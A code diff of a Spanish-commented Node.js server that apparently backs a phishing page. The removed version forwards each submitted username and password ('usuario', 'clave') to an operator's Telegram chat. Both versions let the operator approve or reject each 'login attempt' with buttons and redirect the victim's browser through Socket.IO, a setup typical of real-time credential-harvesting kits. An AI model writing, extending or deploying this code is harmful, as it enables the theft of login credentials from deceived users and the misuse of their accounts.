@@ -1,114 +1,55 @@
-import dotenv from 'dotenv';
-import express from 'express';
-import fetch from 'node-fetch';
-import path from 'path';
-import { fileURLToPath } from 'url';
-import { dirname } from 'path';
-import { createServer } from 'http';
-import { Server } from 'socket.io';
-
-dotenv.config();
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = dirname(__filename);
+const express = require('express');
+const http = require('http');
+const socketIo = require('socket.io');
+const TelegramBot = require('node-telegram-bot-api');
+require('dotenv').config(); // Asegurate de tener tu archivo .env con el token
 
 const app = express();
-const server = createServer(app);
-const io = new Server(server);
+const server = http.createServer(app);
+const io = socketIo(server);
 
-const PORT = process.env.PORT || 3000;
+const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
 
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-app.use(express.static(path.join(__dirname, 'public')));
-app.use(express.json());
-
-let currentSocket = null;
+app.use(express.static('public'));
 
 io.on('connection', (socket) => {
-  console.log('🟢 Cliente conectado');
-  currentSocket = socket;
-
-  socket.on('disconnect', () => {
-    console.log('🔴 Cliente desconectado');
-    currentSocket = null;
-  });
+  console.log('🟢 Cliente conectado vía Socket.IO');
+  global.socket = socket;
 });
 
-app.post('/enviar', async (req, res) => {
-  const { usuario, clave } = req.body;
+// Manda el mensaje con los botones
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
 
-  const mensaje = `🔐 Nuevo intento de acceso:\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}`;
-
-  const opciones = {
+  bot.sendMessage(chatId, 'Nuevo intento de acceso:\nCorreo: test@example.com\nContraseña: ******', {
     reply_markup: {
       inline_keyboard: [
         [{ text: '✅ Aceptar', callback_data: 'aceptar' }],
         [{ text: '❌ Rechazar', callback_data: 'rechazar' }]
       ]
     }
-  };
-
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      ...opciones
-    })
   });
-
-  res.sendStatus(200);
 });
 
-app.post('/webhook', async (req, res) => {
-  const { callback_query } = req.body;
-  if (!callback_query) return res.sendStatus(200);
+// Cuando se presiona un botón
+bot.on('callback_query', (callbackQuery) => {
+  const action = callbackQuery.data;
+  const chatId = callbackQuery.message.chat.id;
 
-  const data = callback_query.data;
-  const chat_id = callback_query.from.id;
-
-  let link = '';
-  let mensaje = '';
-
-  if (data === 'aceptar') {
-    link = 'https://www.mariohernandez.com.co';
-    mensaje = '✅ ¡Acceso aprobado!';
-  } else if (data === 'rechazar') {
-    link = 'https://as.com';
-    mensaje = '❌ Acceso denegado.';
+  if (action === 'aceptar') {
+    bot.sendMessage(chatId, '🟢 ¡Acceso aprobado!');
+    if (global.socket) {
+      global.socket.emit('redirect', '/bienvenido.html');
+    }
+  } else if (action === 'rechazar') {
+    bot.sendMessage(chatId, '🔴 Acceso denegado.');
+    if (global.socket) {
+      global.socket.emit('redirect', '/denegado.html');
+    }
   }
-
-  if (currentSocket) {
-    currentSocket.emit('decision', { tipo: data, url: link });
-    console.log('📡 Emitido al navegador:', data);
-  }
-
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id,
-      text: mensaje,
-      reply_markup: {
-        inline_keyboard: [[{ text: 'Ir ahora', url: link }]]
-      }
-    })
-  });
-
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      callback_query_id: callback_query.id
-    })
-  });
-
-  res.sendStatus(200);
 });
 
+const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-  console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
+  console.log(`Servidor corriendo en http://localhost:${PORT}`);
 });
